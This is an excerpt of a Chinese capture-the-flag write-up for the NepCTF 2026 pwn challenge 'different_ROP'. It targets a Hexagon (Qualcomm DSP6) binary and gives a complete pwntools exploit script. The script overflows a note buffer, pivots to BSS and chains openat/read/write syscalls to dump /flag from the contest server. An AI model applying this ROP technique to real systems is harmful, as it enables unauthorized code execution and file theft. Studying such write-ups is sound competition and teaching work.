> 来源：https://github.com/fjh1997/nepctf2026-writeup/blob/main/writeup/WriteUp_%E5%AE%8C%E6%95%B4%E8%87%AA%E5%8C%85%E5%90%AB.md
> 以下为原始完整 writeup 中 #47 的连续章节摘录；代码未执行。

## #47 different_ROP

### 1. 题目信息
- **题目名称**：different_ROP
- **题目类型**：PWN
- **最终 Flag**：`NepCTF{62577808-83b3-03b5-59d3-8071b012ede9}`

### 2. 题目分析
different_ROP：目标是 Hexagon（高通 DSP6）静态链接、无 PIE。架构少见，工具链和 gadget 都得自己挖。

### 3. 解题思路
**复现确认的主路径是 BSS ROP**，不是早期尝试的 stack 上 `G_SYSCALL` 帧（那条现网/本地都容易崩）。关键地址：`BSS=0x4be00`、`READ_REL=0x215b8`、`SYSCALL=0x21200`。

### 4. 解题过程
`ncat --ssl HOST 443`，然后 `python3 work/47/repro/exp_bss.py remote HOST`。比赛 flag：`NepCTF{62577808-83b3-03b5-59d3-8071b012ede9}`（远程复现会拿到动态 flag）。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/47/repro/exp_bss.py`
```python
#!/usr/bin/env python3
from pwn import *
import struct
context.log_level = 'info'

BSS = 0x4be00
STAGE = 0x4bf00
READ_REL = 0x215b8
SYSCALL = 0x21200
DEALLOC = 0x2120c
SYS_OPENAT, SYS_READ, SYS_WRITE = 56, 63, 64
AT_FDCWD = 0xffffff9c

def p32(x): return struct.pack('<I', x & 0xffffffff)

def build():
    s0 = b'A'*48 + p32(BSS + 0x30) + p32(READ_REL) + b'B'*8
    s1  = p32(STAGE) + p32(SYSCALL)
    s1 += p32(SYS_READ) + p32(0)
    s1 += p32(0) + p32(0)
    s1 += p32(0x200) + p32(0)
    s1 += p32(0) + p32(STAGE)
    s1 += b'C'*8
    s1 += p32(BSS) + p32(DEALLOC)
    s1 += b'D'*(64 - len(s1))
    assert len(s1) == 64
    PATH, FLAGBUF = STAGE+0x100, STAGE+0x120
    FB, FC = STAGE+0x28, STAGE+0x50
    s2  = p32(FB)+p32(SYSCALL)
    s2 += p32(SYS_OPENAT)+p32(0)+p32(0)+p32(0)+p32(0)+p32(0)+p32(AT_FDCWD)+p32(PATH)
    s2 += p32(FC)+p32(SYSCALL)
    s2 += p32(SYS_READ)+p32(0)+p32(0)+p32(0)+p32(0x100)+p32(0)+p32(3)+p32(FLAGBUF)
    s2 += p32(0)+p32(SYSCALL)
    s2 += p32(SYS_WRITE)+p32(0)+p32(0)+p32(0)+p32(0x100)+p32(0)+p32(1)+p32(FLAGBUF)
    s2 = s2.ljust(0x100, b'\x00') + b'/flag\x00'
    s2 = s2.ljust(0x200, b'\x00')
    return s0, s1, s2

def exploit(io):
    s0, s1, s2 = build()
    io.recvuntil(b'> ')
    io.sendline(b'3')
    io.recvuntil(b'note> ')
    io.send(s0)
    try:
        io.recvuntil(b'calibration data recorded', timeout=2)
        io.recvuntil(b'calibration data recorded', timeout=2)
    except Exception:
        sleep(0.5)
    io.send(s1)
    sleep(0.4)
    io.send(s2)
    return io.recvall(timeout=3)

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        host = sys.argv[2] if len(sys.argv)>2 else 'lr5ixbem-mhdh-orok-drcq-6a5cee9b30729-neptunus.nepctf.com'
        io = remote(host, 443, ssl=True)
    else:
        open('flag','w').write('NepCTF{local_test_flag_12345}\n')
        io = process(['./qemu-hexagon', './pwn'])
    data = exploit(io)
    print(data)
    if b'NepCTF{' in data:
        print('FLAG', data[data.find(b'NepCTF{'):data.find(b'}')+1])
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

